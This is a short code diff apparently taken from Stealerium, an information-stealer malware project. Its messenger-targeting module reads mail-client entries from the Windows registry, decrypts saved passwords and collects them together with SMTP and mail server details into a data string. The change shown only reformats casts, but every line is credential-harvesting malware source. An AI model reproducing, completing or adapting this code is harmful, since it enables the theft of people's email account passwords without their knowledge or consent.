@@ -58,13 +58,13 @@ namespace Stealerium.Target.Messengers
                     {
                         var value = GetInfoFromRegistry(path, client);
                         if (value != null && client.Contains("Password") && !client.Contains("2"))
-                            data += $"{client}: {DecryptValue((byte[]) value)}\r\n";
+                            data += $"{client}: {DecryptValue((byte[])value)}\r\n";
                         else if (value != null &&
                                  (SmptClient.IsMatch(value.ToString()) || MailClient.IsMatch(value.ToString())))
                             data += $"{client}: {value}\r\n";
                         else
                             data +=
-                                $"{client}: {Encoding.UTF8.GetString((byte[]) value).Replace(Convert.ToChar(0).ToString(), "")}\r\n";
+                                $"{client}: {Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "")}\r\n";
                     }
                     catch
                     {
